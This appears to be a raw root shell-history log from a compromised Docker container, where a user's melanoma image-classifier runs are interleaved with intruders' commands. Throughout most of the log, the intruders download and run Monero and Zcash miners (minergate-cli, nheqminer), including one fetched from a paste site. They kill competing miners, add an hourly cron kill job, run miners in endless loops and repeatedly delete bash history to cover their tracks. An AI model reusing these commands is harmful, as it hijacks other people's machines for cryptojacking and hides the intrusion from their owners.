+./nheq* -l zec.suprnova.cc:2142 -u th3j0k3r.work3 -p x ### root@f5e57551b879 /dev/pts/0 20161229 21:24 /opt/.z/nheqminer/nheqminer/build
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161229 22:35 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161229 22:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161229 22:35 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 22:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161229 22:35 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 22:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161229 22:35 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 22:35 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/1 20161229 22:35 /root -> /root/.ttmp
+./nheq* -l zec.suprnova.cc:2142 -u th3j0k3r.work3 -p x ### root@f5e57551b879 /dev/pts/0 20161229 22:35 /opt/.z/nheqminer/nheqminer/build
+clear ### root@f5e57551b879 /dev/pts/1 20161229 22:35 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 22:35 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161229 22:36 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 22:36 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161229 22:36 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 22:36 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/1 20161229 22:36 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161229 22:36 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161230 00:17 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161230 00:17 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161230 00:17 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 00:17 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161230 00:17 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 00:17 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161230 00:17 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 00:17 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/1 20161230 00:17 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161230 00:17 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161230 02:08 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161230 02:08 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161230 02:08 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 02:08 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161230 02:08 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 02:08 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161230 02:08 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 02:08 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/1 20161230 02:08 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161230 02:08 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161230 03:33 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/1 20161230 03:33 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/1 20161230 03:33 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/1 20161230 03:33 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/1 20161230 03:33 /notebooks
+ killall ?;top c  ### root@f5e57551b879 /dev/pts/1 20161230 03:33 /notebooks
+pkill m5 && pkill m6 && kill $(ps -eo pid,args --cols=10000 | awk /alexa/)  ### root@f5e57551b879 /dev/pts/1 20161230 03:33 /notebooks
+ kill $(ps -eo pid,args --cols=10000 | awk /jfzero/)  ### root@f5e57551b879 /dev/pts/1 20161230 03:33 /notebooks
+ if [ -f .deb/opt/minergate-cli/minergate-cli ]; then echo "$(tput setaf 2)Was here$(tput setaf 8)";else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && nproc && lspci | grep VGA || true && pkill mine || true && pkill yam || true && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/1 20161230 03:33 /notebooks/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/1 20161230 03:33 /notebooks/.deb/opt/minergate-cli
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### root@f5e57551b879 /dev/pts/2 20161230 03:54 /notebooks
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### root@f5e57551b879 /dev/pts/2 20161230 03:54 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161230 03:54 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161230 03:55 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161230 03:55 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161230 03:55 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161230 03:55 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161230 03:55 /notebooks
+kill -9 31674;  ### root@f5e57551b879 /dev/pts/2 20161230 03:55 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161230 03:55 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/1' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161230 03:55 /notebooks
+bash -i ### root@f5e57551b879 not a tty 20161230 03:55 /notebooks
+bash -i ### @f5e57551b879 not a tty 20161230 20:24 /notebooks
+cd /datamnt/github/keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161230 20:25 /notebooks -> /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161230 20:25 /datamnt/github/keras-cam-melanoma
+ls  weights.* >> LOG  ### @f5e57551b879 not a tty 20161230 20:25 /datamnt/github/keras-cam-melanoma
+ls  weights.* >> LOG  ### @f5e57551b879 not a tty 20161230 20:27 /datamnt/github/keras-cam-melanoma
+grep ~/histlog cam.py  ### @f5e57551b879 not a tty 20161230 20:28 /datamnt/github/keras-cam-melanoma
+grep cam.py ~/histlog  ### @f5e57551b879 not a tty 20161230 20:28 /datamnt/github/keras-cam-melanoma
+grep cam.py ~/histlog  ### @f5e57551b879 not a tty 20161230 20:28 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path examples/dog.jpg --model_path weights.00-loss0.599-acc0.892-valloss0.000-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161230 20:29 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path examples/dog.jpg --model_path weights.31-loss0.115-acc0.945-valloss0.177-valacc0.925.hdf5  ### @f5e57551b879 not a tty 20161230 20:29 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6148bae47801cf7347d1.jpg --model_path weights.31-loss0.115-acc0.945-valloss0.177-valacc0.925.hdf5  ### @f5e57551b879 not a tty 20161230 20:30 /datamnt/github/keras-cam-melanoma
+bash -i ### root@f5e57551b879 /dev/pts/0 20161230 20:31 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161230 20:31 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161230 20:31 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161230 20:31 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161230 20:31 /root/.deb/opt/minergate-cli
+python cam.py --image_path ../../train/benign/558d6148bae47801cf7347d1.jpg --model_path weights.31-loss0.115-acc0.945-valloss0.177-valacc0.925.hdf5  ### @f5e57551b879 not a tty 20161230 20:33 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/benign/558d6148bae47801cf7347ce.jpg --model_path weights.31-loss0.115-acc0.945-valloss0.177-valacc0.925.hdf5  ### @f5e57551b879 not a tty 20161230 20:34 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/benign/558d6148bae47801cf7347d1.jpg --model_path weights.14-loss0.157-acc0.920-valloss0.160-valacc0.923.hdf5  ### @f5e57551b879 not a tty 20161230 20:37 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/benign/558d6148bae47801cf7347d1.jpg --model_path weights.14-loss0.157-acc0.920-valloss0.160-valacc0.923.hdf5  ### @f5e57551b879 not a tty 20161230 20:37 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/benign/558d6148bae47801cf7347d1.jpg --model_path weights.14-loss0.157-acc0.920-valloss0.160-valacc0.923.hdf5  ### @f5e57551b879 not a tty 20161230 20:37 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/benign/558d6148bae47801cf7347ce.jpg --model_path weights.14-loss0.157-acc0.920-valloss0.160-valacc0.923.hdf5  ### @f5e57551b879 not a tty 20161230 20:38 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/benign/558d6148bae47801cf7347ce.jpg --model_path weights.15-loss0.170-acc0.917-valloss0.165-valacc0.918.hdf5  ### @f5e57551b879 not a tty 20161230 20:40 /datamnt/github/keras-cam-melanoma
+python cam.py --image_path ../../train/malignant/558d6148bae47801cf7347d1.jpg --model_path weights.15-loss0.170-acc0.917-valloss0.165-valacc0.918.hdf5  ### @f5e57551b879 not a tty 20161230 20:42 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161230 20:44 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161230 21:04 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161230 21:04 /datamnt/github/keras-cam-melanoma
+nvidia-smi ### @f5e57551b879 not a tty 20161230 21:04 /datamnt/github/keras-cam-melanoma
+nvidia-smi ### @f5e57551b879 not a tty 20161230 21:04 /datamnt/github/keras-cam-melanoma
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161230 21:07 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161230 21:07 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161230 21:07 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161230 21:07 /root/.deb/opt/minergate-cli
+bash -i ### root@f5e57551b879 /dev/pts/0 20161230 21:07 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161230 21:07 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161230 21:07 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161230 21:07 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161230 21:07 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161230 21:42 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161230 21:42 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161230 21:42 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161230 21:42 /root/.deb/opt/minergate-cli
+bash -i ### root@f5e57551b879 /dev/pts/0 20161230 21:42 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161230 21:42 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161230 21:42 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161230 21:42 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161230 21:42 /root/.deb/opt/minergate-cli
+bash -i ### root@f5e57551b879 /dev/pts/1 20161230 22:11 /notebooks
+bash -i ### root@f5e57551b879 /dev/pts/1 20161230 22:11 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161230 22:11 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 22:11 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /notebooks
+kill -9 1444;  ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/0' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /notebooks
+kill -9 360;  ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161230 22:12 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 22:13 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161230 22:13 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161230 22:13 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/1 20161230 22:13 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161230 22:13 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161230 22:17 /notebooks
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161230 22:17 /notebooks -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161230 22:17 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161230 22:18 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161230 22:18 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161230 22:53 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161230 22:53 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161230 22:53 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161230 22:53 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161230 22:53 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161230 22:53 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161230 22:53 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161230 22:53 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161230 22:53 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161230 23:28 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161230 23:28 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161230 23:28 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161230 23:28 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161230 23:28 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161230 23:28 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161230 23:28 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161230 23:28 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161230 23:28 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 00:02 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 00:02 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 00:02 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 00:02 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 00:02 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 00:02 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 00:02 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 00:02 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 00:02 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 00:37 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 00:37 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 00:37 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 00:37 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 00:37 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 00:37 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 00:37 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 00:37 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 00:37 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 01:11 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 01:11 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 01:11 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 01:11 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 01:11 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 01:11 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 01:11 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 01:11 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 01:11 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 01:45 /root/.deb/opt/minergate-cli
+ while :; do ./minergate-cli -user alekx12555@mail.ru -xmr;pkill mine && pkill m5;pkill yam; done ### root@f5e57551b879 /dev/pts/0 20161231 01:45 /root/.deb/opt/minergate-cli
+clear ### root@f5e57551b879 /dev/pts/0 20161231 01:45 /root/.deb/opt/minergate-cli
+echo START ### root@f5e57551b879 /dev/pts/0 20161231 01:45 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161231 01:45 /root/.deb/opt/minergate-cli
+cd ~ ### root@f5e57551b879 /dev/pts/0 20161231 01:45 /root/.deb/opt/minergate-cli -> /root
+pkill mine;pkill yam;killall ? ### root@f5e57551b879 /dev/pts/0 20161231 01:45 /root
+if [ -f .deb/opt/minergate-cli/minergate-cli ]; then sleep 1;else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/0 20161231 01:45 /root/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/0 20161231 01:45 /root/.deb/opt/minergate-cli
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161231 02:01 /notebooks
